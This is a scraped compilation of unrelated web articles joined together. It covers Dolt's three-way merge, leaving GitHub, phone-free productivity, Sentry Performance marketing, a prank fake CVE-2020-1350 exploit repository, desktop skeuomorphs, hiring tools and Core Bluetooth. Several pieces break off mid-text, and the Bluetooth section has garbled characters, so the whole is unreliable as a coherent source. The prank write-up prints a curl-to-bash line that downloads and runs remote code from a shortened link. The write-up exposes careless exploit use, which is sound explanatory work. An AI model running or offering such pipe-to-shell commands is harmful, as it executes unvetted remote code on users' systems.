document that includes all the changes from both histories. In the context of
Dolt where the "source document" is the value of the database at a commit, the
fundamental operation is something like <code>newDatabaseValue :=
Merge(intoDatabaseValue, fromDatabaseValue)</code>.</p>
<p>The fundamental question is how to construct the <code>newDatabaseValue</code> given the
two database values which should be merged. There have been numerous solutions
to this problem in a variety of contexts, including collaborative file
editing, databases and version control systems. Dolt takes its approach to
merges from Git, and it implements a traditional algorithm from VCS, a
three-way merge.</p>

<p>A three-way merge works in the context of the commit graph and a recorded and
available history for how the database came to have <code>intoDatabaseValue</code> and
<code>fromDatabaseValue</code>. It builds on top of <code>diff</code>, which was explained in
<a href="https://www.dolthub.com/blog/2020-06-16-efficient-diff-on-prolly-trees/">my previous blog post</a> and it
works on three independent commits:</p>
<ul>
<li><strong>into</strong>—The head of the branch being merged into. Often something like <code>main</code>.</li>
<li><strong>from</strong>—The head of the branch being merged from. Often a feature branch.</li>
<li><strong>ancestor</strong>—The nearest common ancestor of <strong>into</strong> and <strong>from</strong>.</li>
</ul>
<p>On a Dolt commit graph, with the commits pointing to their parents, this looks
something like:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a10faf8b5fe1f4329112153f729fabfc/72799/merge-commit-graph.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="merge commit graph" title="merge commit graph" src="https://www.dolthub.com/blog/static/a10faf8b5fe1f4329112153f729fabfc/72799/merge-commit-graph.png" srcset="https://www.dolthub.com/blog/static/a10faf8b5fe1f4329112153f729fabfc/a48b3/merge-commit-graph.png 214w,

  </a>
    </span></p>
<p>When running <code>dolt merge</code>, <strong>into</strong> and <strong>from</strong> are explicit based on the
working directory and the CLI invocation. <strong>into</strong> comes from the branch that
is currently checked out in the working directory. <strong>from</strong> comes from the
commit that is supplied on the command line. But <strong>ancestor</strong> is based on the
repository state and relationship between <strong>into</strong> and <strong>from</strong>. It is found
automatically by inspecting the parents of <strong>into</strong> and <strong>from</strong>.</p>
<p>The nearest common ancestor is the ancestor where the commits most recently
diverged from each other.<sup id="fnref-1"><a href="#fn-1">1</a></sup> We find this commit by walking the parents of
<strong>into</strong> and <strong>from</strong> in breadth-first order until we find a common
commit.</p>
<h2>Diffs and Finding Conflicts</h2>
<p>The fundamental observation of three-way merge is that if we look at all the
changes between <strong>ancestor</strong> and <strong>into</strong> and all the changes between
<strong>ancestor</strong> and <strong>from</strong>, that is the set of changes that should appear in
the value that results from the merge of <strong>into</strong> and <strong>from</strong>.</p>
<p><code>Diff(ancestor, into)</code> defines all the changes that have occured on <strong>into</strong>
since it diverged from its common ancestor with <strong>from</strong>. And symmetrically,
<code>Diff(ancestor, from)</code> defines all the chages that have occurred on <strong>from</strong>
since it diverged from its common ancestor with <strong>into</strong>. If all of those
changes are reflected in the database value resulting from <code>Merge(into,
from)</code>, the value will be the one we want.</p>
<p>Dolt does this by merging the diffs by primary key on table data for each
table in the database. After finding the commit <strong>ancestor</strong>, it streams
<code>Diff(ancestor, into)</code> and <code>Diff(ancestor, from)</code>. It visits differences in
primary key order using a merging iterator of the two diffs.</p>
<ol>
<li>If <code>Into.Key &lt; From.Key</code>: the value for the row in <code>into</code> is the right
value in the output.</li>
<li>If <code>Into.Key &gt; From.Key</code>: the value for the row in <code>from</code> is the right
value in the output.</li>
<li>If <code>Into.Key == From.Key &amp;&amp; Into.Value == From.Value</code>: the same change was
made in <code>into</code> and <code>from</code> and there is no conflict. The value of the row is as
it is in <code>into</code> and <code>from</code>.</li>
<li>Otherwise, <code>Into.Key == From.Key</code>, but the rows are not identical. In this
case, Dolt falls back to cell-level merge of the rows.</li>
</ol>
<p>A cell-level merge means that the merged value for that row is not a conflict
if the changes didn't touch the same columns. Specifically:</p>
<ul>
<li>If one of the changes is a delete and the other is not, then there is a
conflict.</li>
<li>If, for any column α in the table, <code>into</code> changes the value of column
α to be χ, and <code>from</code> of the changes the value of column α to
be γ, where χ is not equal to γ, then there is a conflict</li>
<li>Otherwise, the value of the row in the merged output is equal to the value
of the row as it appears in <strong>ancestor</strong>, with all of the column mutations in
<strong>into</strong> applied to it and all of the column mutations in <strong>from</strong> applied to
it.</li>
</ul>
<p>Here's an example of the two diffs merge might be operating on:</p>
<div>
<pre>+-----+------------+------------+------------+        +-----+------------+------------+------------+
|     | name       | population | capital    |        |     | name       | population | capital    |

+-----+------------+------------+------------+        +-----+------------+------------+------------+
</pre>
</div>
<p>In this example, <code>california</code> will be covered by case #1, <code>new york</code>
by case #2, and <code>usa</code> by case #3. <code>texas</code>, because it is modified in
both branches and has a conflicting column value, will end up as a
conflict in case #4. <code>vermont</code> will also be handled by case #4, but
because the two branches modified different columns, there will be no
conflict. The resulting row will reflect both changes: a population of
623,989 and a capital of Montpelier.</p>
<p>In reality, when implementing the above algorithm, Dolt is operating on an
editor for the table data in <strong>into</strong>, not <strong>ancestor</strong>. Thus, Dolt skips over
entries matching step 1 and 3, it applies all the diffs matching step 2 to the
current table value, and it applies the cell-level diffs on non-conflicting
changes matching step 4 only from <code>from</code>.</p>
<p>Dolt's three-way merge works great in the case that the two divergent
histories work on independent parts of the database. But if they both update
portions of the database with conflicting values, then it fails to produce a
database value that incorporates both sets of changes. Instead, it falls back
to producing <code>conflicts</code> and it leaves it up to the user to resolve conflicts
and get the database into a state that reflects both sets of changes.</p>
<h2>Representing Conflicts</h2>
<p>The result of the merge algorithm is a new table value for the table in the
working set plus a possibly empty set of conflicting rows which could not be
merged successfully.  Conflicts in Dolt are always on a row in a table. The
primary key is the same between <strong>into</strong> and <strong>from</strong>, but the values for at
least one column in the row were different between the two commits and that
column's value was changed by both histories since <strong>ancestor</strong>.</p>
<p>Conflicts in Dolt are stored by primary key along-side the table data for the
table, in a separate Prolly-tree from the table data itself. Each row in the
conflicts Prolly-tree stores the value of the row as it appeared in all three
commits involved in the merge: <strong>into</strong>, <strong>from</strong> and <strong>ancestor</strong> . This
allows for programmatic resolution strategies to see the relevant row-related
data if necessary.</p>
<p>Conflicts after a merge can be resolved one-by-one, by setting the row to a
certain value and removing the conflict from the conflicts row data.  Dolt also
has built-in bulk resolution strategies, such as take-ours and take-theirs.
For example, to merge a feature branch into your current working branch and
overwrite all conflicts back to their values as they are in your current
working branch, you an do:</p>
<div data-language="sh"><pre><code>$ dolt merge feature-branch
$ dolt conflicts resolve --ours table_with_conflicts</code></pre></div>
<p>Currently Dolt considers any table that has unresolved conflicts in its
conflicts Map to be unmerged and it will not allow a commit to be created with
any unmerged table values. That means that table values that carry conflicts
cannot appear in commits. This is a small divergence from git, which places the
conflicts as textual markers directly in the working tree (if those files are
text files) and will allow files with conflict markers to be staged for commit
with something like <code>git add -f</code>.</p>

<p>We took a quick look at how three-way merge works and saw that it applies very
naturally to table data as Dolt represents it. While a cell-level three-way
merge isn't the most natural fit for every database merge use case, we think
it's a really good starting point for human scale databases that have
feature-level collaboration. That being said, this space is one corner of Dolt
that's ripe for innovation, and we hope to see a lot of feature work here in
the future. Some things we would to implement include:</p>
<ul>
<li>Recursive three-way merge, for when a nearest common ancestor is not
uniquely defined.</li>
<li>A larger suite of conflict resolution strategies, potentially building on
type-specific merge-lattices from CRDTs for example.</li>
<li>A larger suite of conflict …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>If you're looking for a more reasoned argumentation, see Update 3 at the bottom.</em></p>
<p>I rarely interact with <a href="https://github.com/">Github</a> anymore. All my projects are either on my selfhosted <a href="https://gitea.io/">Gitea</a> instance or on <a href="https://codeberg.org/">Codeberg.org</a>. That's why I missed the following on <a href="https://www.githubstatus.com/">Github Status</a>:</p>
<p><img src="https://yarmo.eu/content/img/github_status.png" alt="Github status shows a lot of downtimes"><br>
<em>Yikes</em></p>
<p>Yikes, indeed. How everyone handles this is up to them. Large projects will find it hard to move, no doubt.</p>
<p>My interpretation? The Microsoft Github ship is sinking and it's sinking faster every day. The beauty is: you don't need them. Instead of relying on Github, you could:</p>
<ul>
<li>selfhost your own <a href="https://gitea.io/">Gitea</a> instance if you have the knowledge;</li>
<li>use <a href="https://codeberg.org/">Codeberg.org</a> which also uses <a href="https://gitea.io/">Gitea</a>;</li>
<li>use <a href="https://sourcehut.org/">sourcehut.org</a> which takes a different but very solid approach to git hosting;</li>
<li>use any instance generously hosted by amazing people (think <a href="https://libreho.st/">libreho.st</a> and <a href="https://chatons.org/">Chatons</a>);</li>
<li>use <a href="https://gitlab.com/">gitlab.com</a> or selfhost an instance.</li>
</ul>
<p>There are so many better places to be for git hosting nowadays. For an easy performance comparison of different services, see <a href="https://forgeperf.org/">forgeperf.org</a>.</p>
<p>Abandon the corporate ship before or after it sinks, up to you.</p>

<h2>Update 1</h2>
<p>Added <a href="https://forgeperf.org/">forgeperf.org</a> link after suggestion by <a href="https://mstdn.io/@slow">@slow@mstdn.io</a>.</p>

<h2>Update 2</h2>
<p>Added <a href="https://sourcehut.org/">sourcehut.org</a> link after suggestion by <a href="https://social.privacytools.io/@freddyym">@freddyym@social.privacytools.io</a>.</p>
<hr>
<h2>Update 3</h2>
<p>Don't publish on your website when you are feeling frustrated; that's what Twitter is for.</p>
<p>Let's inject some reason here. Github isn't dying anytime soon. Certainly not due to this number of outages. And all software breaks, so that's no measure; what matters is the response. And Github is on it. Like every single other time it was broken.</p>
<p>But that doesn't mean we can't change the status quo. Almost every defense of Github comes down to discoverability: if I put my project on Github, others will find it. If I put it elsewhere, other won't find it.</p>
<p>Do not forget: Github's discoverability comes from us, the userbase. We the developers make or break Github. If we all move, Github shuts its doors. This won't happen. But look at the landscape: so many alternative solutions exist, Github is no better than any other service and, in the eyes of some, me included, Github may actually provide a worse experience than most alternatives.</p>
<p>And about discoverability. Have you heard of social media? Blog posts? I discover a lot of new Github projects on a regular basis and almost none, I have discovered via Github itself. People talk about good projects and share them, plain and simple.</p>
<p>If you simply like Github and their network and their continuously "evolving" UI, have at it. To each their own.</p>
<p>If you don't like Github, do not stay. Be the change you want to see.</p></div></div>]]>

                <p>I wasn't always productive.</p><p>I used to spend my days and nights surfing Instagram and Snapchat while watching funny cat videos as a part time job.</p><p>It was boring, useless, and silly.</p><p>But after 3 years of self development and web development, <strong>I now only spend less than 20 minutes a day on my cell phone</strong>. Here's proof:</p><figure><img src="https://joshternyak.com/content/images/2020/07/screen-time.png" alt="screen time less than 20 minutes" srcset="https://joshternyak.com/content/images/size/w600/2020/07/screen-time.png 600w, https://joshternyak.com/content/images/size/w1000/2020/07/screen-time.png 1000w, https://joshternyak.com/content/images/size/w1600/2020/07/screen-time.png 1600w, https://joshternyak.com/content/images/size/w2400/2020/07/screen-time.png 2400w"></figure><p>As you can see, I spend 38 minutes on "Social Networking", which only includes messenger and the alarm clock. I DO NOT have any social media apps on my cell phone. </p><p>Completely removing non-essential apps from my phone has saved me quite literally my life (to clarify: my definition of "my life" is what I spend all of my time on).</p><p>But how did I, a 15 year old web nerd who used to spend 7+ hours on my cell phone like millions of others, "become" so <strong>productive</strong>?</p><p>I'll tell you..</p><h2 id="wasting-your-time-wasting-your-life-">Wasting your time = wasting your life.</h2><p>We all know humans have become professional time-wasters, whether it's surfing Snapchat for funny stories or posting on Facebook how bored they are.</p><p>I used to do these exact same things.</p><p>But then I did something that completely changed my life:</p><blockquote><strong>I FORCED MYSELF TO REALIZE THAT WASTED TIME = WASTED LIFE</strong></blockquote><p>For anyone who has trouble with productivity, this is the most important piece of advice I can give you:</p><blockquote>Once you realize that wasting time means you're wasting your life, then you'll probably want to change something about what you do everyday.</blockquote><p>But that probably leaves you with the question:</p><p>So, how did I, Josh Ternyak, actually reduce my screen time from 7+ hours a day (full time job) to less than 20 minutes a day 😎?</p><p>Here's how:</p><ol><li>I found meaningful work to do to fill up my time instead of removing distractions and not having anything important to do</li><li>I deleted ALL APPS except for the apps the Iphone is made with to start with</li><li>I put my cell phone in the opposite side of the house shut off completely</li></ol><h2 id="it-s-not-that-scary-">It's not that scary.</h2><p>And that's it! It's less scary than it seems. </p><p>I remember the days when I was glued to my phone. And I'm NEVER going back to that lifestyle.</p><p>Now that I'm working on so many great projects, learning new skills, and spending my time on the important things in life, I hope what I've learned along the way will help you save your time, and quite literally...your life.</p>

Leaders don’t rest on their laurels. That’s what motivated us to create Performance, our new code monitoring offering: to build off our core functionality and toward the demands developers face, both today and in the future. </p>
<p>From tracking down slow-loading pages to ensuring auto-completes actually complete, <a href="https://docs.sentry.io/performance-monitoring/getting-started/">Performance</a> gives you deeper visibility into the API calls and database queries that are critical toward delivering fast customer experiences with just five lines of code. </p>
<blockquote>
<p>We’ve been using Sentry since the early days of Tackle, so getting set up with Performance was literally a one-line change for us. It quickly identified problematic endpoints and how our users were being impacted. We’re now planning some improvements to these APIs; can’t wait to see those times go down!</p>

</a>Developers: Take Comfort in Resolving User Misery</h2>
<p>Slow is a relative term. It’s why, in order to properly troubleshoot a slow customer experience, you need a consistent metric for slow. Enter User Misery. By pairing industry metrics with user metrics, User Misery tells you what is making any number of users…miserable. This means getting out in front of painful experiences before they become problems, and problems before they cause your customers to churn.</p>

</a>Mission-critical Context</h2>
<p>Without context, a customer’s spinning pinwheel can quickly turn into a developer’s panic spiral. Transaction Summary surfaces transactions by duration time, related code errors, and impact to the customer. With it, you can quickly see the number of affected users as well as the transaction’s impact on your response time. And by defining Key Transactions, your team can prioritize those critical functions and callbacks that need to be addressed immediately.</p>

</a>Untangle Tracing</h2>
<p>Some error monitoring tools show you data from a frontend error. Only Performance can trace that frontend back to its API calls and slow database queries - all while surfacing related errors. What’s more, Performance aggregates the metadata surrounding your errors so you can easily search and sort your exceptions.</p>
</div><div>
<blockquote>
<p>Sentry’s performance tracking has been a huge help for us. Before, it was difficult to know exactly how long key functions actually took to load in real-time conditions. Now, we have metrics to assess whether load times are acceptable and we can learn which conditions impact performance, as part of our drive to constantly improve the user’s experience.</p>

</figure><p>Before we dive into the actual research, here's what actually happened for those who didn't see the fallout, unless you are in the security space and familiar with what happened last 36 hours, it probably won't make much sense quickly.</p><ol><li>Microsoft has a critical flaw in DNS server which resulted in a CVSS 10, CVE-2020-1350 is a real vulnerability that was published:<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1350">https://nvd.nist.gov/vuln/detail/CVE-2020-1350</a> It's a brand new vulnerability therefore people would be interested in a proof of concept.</li><li>A security company publishes the info - no public exploit available at the point of publishing this blog, &nbsp;a quick kudos to the team over at Checkpoint Research who found the original vulnerability and published <a href="https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/">a great write up which can be found here.</a></li><li>I created a fake exploit on GitHub minutes after the original blog post was published - playing a prank on hackers and other security companies picking up and publishing in threat intelligence feeds. The code was initially just a bash script then I added a binary loaded with canary tokens to track who was running the script. If anyone is interested Thinkst has a great blog around how canary tokens work <a href="https://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html?m=1">that can be found here.</a></li><li>Lots of people ran the code or helped spread the existence of the fake exploit, folks ran the "proof of concept" code without reading it first and got trolled. If I had been malicious I could have done something much worse than rick-rolling.</li><li>The repository also contains a real fix for the vulnerability. Which can be found here:</li></ol><pre><code>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v "TcpReceivePacketSize" /t REG_DWORD /d 0xFF00 /f
net stop DNS &amp;&amp; net start DNS</code></pre><div><p>This is a particularly "amusing" troll because the sort of people who keep up with CVEs and look for proof-of-concept exploits should really know better than to run random code they just got off GitHub without checking what it does. It's obvious with the most cursory examination of the code in the repo that you shouldn't run it, exploit.sh contains:</p><p>curl -L <a href="https://bit.ly/3exifav">https://bit.ly/3exifav</a> | bash</p><p>The code in the repo is loaded with canary tokens and just general trolling, the list of files below details what each thing is and what it does.</p></div><ul><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/CVE-2020-1350.exe">CVE-2020-1350.exe</a> - Benign binary which opens rick roll and pings canary token</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/Fix.bat">Fix.bat</a> - Batch file that applies the fix from Microsoft</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/LICENCE">LICENCE</a> - The licence file, also does nothing</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/PoC.exe">PoC.exe</a> - &nbsp;Benign binary which opens cmd.exe and additionally pings canary token</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/README.md">README.md</a> - Details the README of the repo</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/README.pdf">README.pdf</a> - Pings a canary token, also a benign document</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/exploit.sh">exploit.sh</a> - Rick roll in shell, also benign</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/windows-exploit.ps1">windows-exploit.ps1</a> - Rick roll in shell, also benign</li></ul><p>So rewind for a second, some of you may be reading thinking WTF is this?

      <p>You’ve always been a bit suspicious of the trashcan on your computer’s imaginary desk top, and I’m here to tell you why.&nbsp;</p><p>I know what you’re thinking –&nbsp;<em>I figured it out already, in real life no one keeps a trashcan on top of their desk.</em> Yes, this adds to the tension. But the real reason is, I think, far more interesting.</p><p>The trashcan is an example of a <em>skeuomorph </em>– an intentional borrowing from a prior time that exists as a bridge to the past in order to make people feel comfortable and familiar.</p><p>There are skeuomorphs all around you. Your electric car has a decorative front grille that it doesn’t need, plastic pieces painted to resemble chrome of Detroit’s glory years, and sometimes even decorative wheel spokes to harken back to the horse-and-carriage days. Many pre-WWII American diners copied the form factor and appearance of rail dining cars, and the later diners aped those in turn. Some of those diners sport modern LED-powered blinking OPEN signs that mimic their neon forebearers. A fully electronic Las Vegas slot machine still comes with a long pull arm despite not needing any gears to turn, and the Nest thermostat has a rotary knob at least in part because so did thermostats before it.</p><p>It is exactly here, in the world of electronics and pixels, where you find the most skeuomorphs – that world simply moves too fast for our collective comfort. Some skeuomorphs <a href="https://www.technologizer.com/2010/03/29/microsoft-bob/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">tried too hard</a> and <a href="https://guidebookgallery.org/guis/magiccap/screenshots?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">went too far</a>.

You could make the same argument for the handset icon for your voice call app. The sophisticated page-turning animation on the early iPads was widely ridiculed as the least important part of “paperness,” and Craig Mod once <a href="https://craigmod.com/journal/subcompact_publishing/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">pointed out</a> that on the same device, Apple’s much-hyped Newsstand was a grotesque calque of the analogue newsstand –&nbsp;the entire point of the original was to allow to look at glorious covers, which the new version bastardized into but a few coarse pixels. Perhaps we should’ve ripped off the bandaid right there and then.</p>

      <p>My favourite example in that genre might be the calculator on your computer, its form factor frozen in 1970s, down to onscreen buttons that are slower and more cumbersome than the keys on the keyboard <em>your fingers are already on top of. </em>Its operation is so primitive – only one number at a time, only one slot for memory –&nbsp;it borders on parody. Grab any <a href="https://soulver.app/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">modern</a> calculator <a href="https://numi.app/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">app</a> and you’ll see how much easier it is to understand and engage with math if you’re not beholden to old conventions.</p><p>And right next to that calculator, there’s the trashcan.&nbsp;</p><p>The premise was pretty fantastic. During the 1970s and early 1980s, people at Xerox Parc and Apple wanted to simplify computers to make them more palatable for people who never used computers before. On the hardware side, that meant mice and nice graphical displays. And what was shown on those displays – a pixelated representation of their offices – made perfect sense to office workers meant to use them: papers that you could drag to a printer, a clipboard to keep snippets of text, and a little calculator resembling the one on their desk. And, in the corner, a trashcan they could use to get rid of unwanted documents.</p>

      <p>The new idea – known as “the desktop metaphor” – felt visible and tangible. Dragging something to a trashcan was far more natural than typing DEL FILE.TXT. But, more importantly, a file in a trashcan could be retrieved back. This was a filesystem equivalent of Undo introduced at around the same time, too;&nbsp;a beautiful safety hatch that helped you worry about computers less.</p><p>All of this worked. And a few years later, in System 4, the trashcan borrowed even more from the real world – its representation would bulge a bit whenever it had files inside. It seemed like a great, useful idea. But, without anyone noticing, it made the trashcan so much worse.</p>

      <p>You see, in the real world, a trashcan filled with old stuff is an unwelcome state. Organic trash rots and smells. Office trashcan filled with too much crap won’t make you any friends. An overflowing trash bin on the street is a sign of failed infrastructure.</p><p>But none of this applies to computers. It’s quite the opposite. The more stuff you have in your trash, <em>the more useful it is. </em>The more you neglect it, the further back in time you’ll be able to get to recover files you thought long gone.</p><p>Having another icon representing a filled trashcan on your screen makes you instinctively want to empty it (which often comes with a nice rewarding sound, too). But every time you do this, you remove your own safety hatch.</p><p>The designers at Apple never realized this. What’s even worse, their approach was copied by pretty much every other graphical operating system:</p>

      <p>The bulging trashcan is my favourite example of the tricky nature of skeuomorphs. There are skeuomorph stories in the book, of course: early Caps Lock keys physically depressing to mimic typewriters, a Typewriter key on a young word processor. Even here, <a href="https://www.getrevue.co/profile/shift-happens/issues/a-love-letter-to-the-in-betweeners-101403?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">I once wrote about in-betweeners</a>.</p><p>But these days, I also wonder about visual skeuomorphism. See, many typewriter books look like this:</p>

      <p>If you’re a person of a certain age, you have typed on a keyboard using Gorton Normal. BBC computers, Compaq portables, DEC and TeleVideo terminals, CDC supercomputers, many PC clones, and Apple II all chose it. IBM eventually switched to Helvetica, but before that, they also borrowed a version of Gorton’s typeface. Hell, Gorton Normal even made it to the Moon aboard Apollo 11 and its famous DSKY keyboard.</p>

      <p>The work’s not done yet. I’m not a professional type designer, and despite the simplified nature of Gorton – and skipping lowercase altogether – some of the shapes are pretty complicated. But it’s fun to see it in my limited use already: the awkwardness of some of the distinctive digits, the pound sign every BBC computer user had nightmares about, the <em>five </em>versions of zero I found throughout ages.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>I get a lot of questions about which hiring tools do what and how they’re different from each other, so I decided to draw an ugly, yet handy, picture (see below).</p>



<p>By the way, the reason this post has “unbundled” in the title is that many hiring tools, in part because we’re all on the VC funding treadmill, aspire to be more than they are and to ultimately be the one ring that rules them all, all the way from sourcing to interviewing to reference checks to onboarding to god knows what. So far, these attempts at grand unification, much like communism, have not panned out in practice. Though most tools claim to do more, most do more badly<sup><a href="#footnote_0_2396" id="identifier_0_2396" title="Not all… some do a decent job of this.">1</a></sup> but will try to upsell you on how they can solve <em>all</em> your hiring needs. Therefore, in the picture below, I’ve chosen the primary use case for each tool, i.e. the use case that each tool has actually gotten traction for (and the use case that I believe they’re actually good at).</p>



<p>And last thing. I run interviewing.io, which means that my take on other tools is indiscriminately biased. But, hell, it’s my blog, and I can say whatever I want… and having been in this industry for almost 10 years as an engineer and later as both an in-house and an agency recruiter and having spent the past 5 years running a successful hiring marketplace, I have acquired my prejudices the honest way, through laboratory experience.<sup><a href="#footnote_1_2396" id="identifier_1_2396" title="The bit about acquiring your prejudices the honest way is one of my favorite quotes, and credit goes to James Roberge, electrical engineering professor at MIT.">2</a></sup></p>



<figure><img src="http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-750x422.png" alt="" width="750" height="422" srcset="http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-750x422.png 750w, http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-450x253.png 450w, http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-768x432.png 768w, http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11.png 960w" sizes="(max-width: 750px) 100vw, 750px"></figure>



<p>All that said, a few of the choices I made in the picture probably require some explanation, so here goes…</p>



<p><em>I thought HackerRank also had an interview tool.&nbsp;</em><br>Yep, they do, it’s called CodePair. However, last I checked, in order to use it, you also had to buy other things, i.e. you can’t just use CodePair for technical interviews without buying in to the broader HackerRank ecosystem. And though CoderPad isn’t paying me for this, I think it’s a superior tool on many levels (and the one we actively chose to use inside of interviewing.io, forsaking all others). CodeSignal also has their own tool and Codility does as well, but that’s kind of the point of this post: tools unbundled. I’m listing the tools that have the differentiator in question as their core competency, not an add-on on some enterprise checklist.</p>



<p><em>Why is Triplebyte in the middle of the sourcing section?</em><br>Triplebyte recently pivoted to a new model. Instead of interviewing their candidates before sending them to customers, they now rely on a quiz, the results of which they use to annotate candidate profiles that recruiters can source from. Before that, they had their own interviewers conduct technical interviews with candidates and also had their talent managers match candidates to companies.</p>



<p><em>I thought Hired, AngelList, and LinkedIn had some kind of skills assessment/technical vetting?</em><br>They do, but last I checked it was an asynchronous test (rather than a human interviewer). In my opinion, asynchronous skills testing on these platforms has some value, but it’s quite limiting for a few reasons:</p>



<ul><li>Skills testing for candidates is optional on these platforms, which means that 1) not all profiles are vetted and 2) you get a good amount of selection bias for candidates without leverage taking them, e.g. juniors and people who need new visa sponsorship</li><li>Much easier to cheat</li><li>And of course asynchronous tests are lower fidelity than human interviewers (or at least the ones I’ve seen to date… but I want to be proven wrong)</li></ul>



<p><em>I thought AngelList had interested candidates come to you?</em><br>They do. But like any jobs board, it’ll be noisy and probably full of candidates who don’t have much leverage, e.g. juniors/bootcamp grads and people requiring visa sponsorship.</p>



<p><em>Should I use take-home tests in my process?</em><br>As with many of my answers, it’s a matter of leverage. Candidates who have lots of options probably won’t spend time on take-homes. Candidates who don’t, either because they’re junior or because they don’t get a lot of recruiter outreach for other reasons, will.</p>



<p><em>Why are you so obsessed with leverage?</em><br>Because market forces rule everything around me.</p>



<p><em>Hey, if you do sourcing, why does your company literally have “interviewing” in the name?</em><br>The way we get candidates into our ecosystem is by offering them mock interviews. Then top performers from our practice pool can choose to use us for their job search. The name originally was meant to highlight the practice offering, but yeah, it’s confusing.</p>



<p><em>Is interviewing.io a good way to source candidates?</em><br>Yes. Yes it is.</p>

<h2 id="introduction">Introduction</h2>
<p>Itâ€™s really hard to overstate how much smartphones and tablets have transformed the world. Starting with the iPhone in 2007, these devices combine gorgeous and intuitive touch interfaces with a full suite of network technologies.</p>
<p>As an iOS developer, I wouldnâ€™t consider myself a stranger to networking. Itâ€™s almost a bread-and-butter requirement that every app these days has <em>some</em> kind of REST API that handles the encoding and decoding of data to and from a remote source.</p>
<p>But that side of the technology aside, another huge side of networking on a smartphone that Iâ€™ve never personally explored before is Bluetooth. And yet, sitting here, writing this post wearing my wireless headphones, with an Apple Watch strapped to my wrist, after I just played some Animal Crossing on my Nintendo Switch with a wireless Pro Controller, I feel like Bluetooth is something I take for granted. Itâ€™s a black box of magic that I never worry about in my day-to-day life. Itâ€™s just there, and it just worksâ„¢.</p>
<p>In all of my iOS engineering career, Iâ€™ve never been involved in a project, or had a need in any of my side projects, to learn the Bluetooth APIs Apple provides. So when my buddy Max asked me if Iâ€™d be interested in writing an app in order to demonstrate how Core Bluetooth works, and following up with a blog post on the experience, I jumped at the chance.</p>
<p>This blog post is geared for anyone else in the same boat as me. Someone who might not necessarily be a newbie to developing for Apple platforms, but has just never stopped to learn how the Core Bluetooth APIs work. Iâ€™ll discuss the core concepts behind Core Bluetoothâ€™s parent/child architecture, show how to send some basic data between devices, and then discuss some of the pitfalls I encountered.</p>
<h2 id="whatiscorebluetooth">What is Core Bluetooth?</h2>
<p>Core Bluetooth is an Apple public framework, and the only official way for third party apps to integrate Bluetooth functionality into their apps on iOS and iPadOS.</p>
<p>Up until this point, Core Bluetooth has been an abstraction over Bluetooth Low Energy (BLE), which is different from â€œclassicâ€� Bluetooth in allowing far more energy efficient communication to support low-powered devices. </p>
<p>What this has historically meant is that Core Bluetooth was aimed at low powered peripheral devices such as heart rate sensors, or home automation; the kinds of devices that primarily reside in a low power state and periodically broadcast small tidbits of information. </p>
<p>By contrast, devices using classic Bluetooth (like game controllers and wireless headphones), which are much more high powered and constantly streaming data, were previously impossible to access from third party apps.</p>
<p>However, as of iOS 13, Apple expanded Core Bluetooth to cover classic Bluetooth devices as well. While the public API hasnâ€™t changed through this, it does mean that a much wider variety of wireless devices now became available through it.</p>
<p>With all of these amazing capabilities, there has never been a better time to start learning how to adopt Core Bluetooth.</p>
<h2 id="basicconceptsofcorebluetooth">Basic Concepts of Core Bluetooth</h2>
<p>When working with Core Bluetooth, it is necessary to become accustomed with the specific terminology of all of the major components of the service and how they relate to each other.</p>
<h3 id="centralsandperipherals">Centrals and Peripherals</h3>
<p>BLE operates in a very traditional server/client sort of model. One device acts in the capacity of a server that contains information, and another acts as a client that queries for this information and processes/displays it locally.</p>
<p>Some devices broadcast advertisements about themselves. These are called "peripherals". Other devices scan for and connect to peripherals. These are called "centrals". After they are connected, usually the peripheral acts as the server and the central acts as the client. This is the way Core Bluetooth operates.</p>
<p>As a general example, when pairing a pair of Bluetooth headphones to a smartphone, the smartphone would be the central, and the headphones would be the peripheral.</p>
<p><img alt="Core Bluetooth Centrals Peripherals and Characteristics" src="https://images.ctfassets.net/38nhe7v4wswj/2phxlIZJeVuCblurCN3dIu/73b504d15b4fae4c38acff1121a2232e/core_bluetoot_central_peripheral_char.jpg"></p>
<h3 id="services">Services</h3>
<p>Obviously, the type of BLE device in question will determine what sort of capabilities it has. For example, a heart rate monitor can record a wearerâ€™s heart rate, but a smart thermostat would record the current temperature of its location.</p>
<p>Most apps will be built to support one or more specific class of device capability. For example, apps for tracking a user's health would have no interest in connecting to devices that aren't health related, such as a thermostat. In order to encapsulate and report on the capabilities of specific peripherals, Bluetooth requires that peripherals identify their classes or capabilities as â€œservicesâ€�.</p>
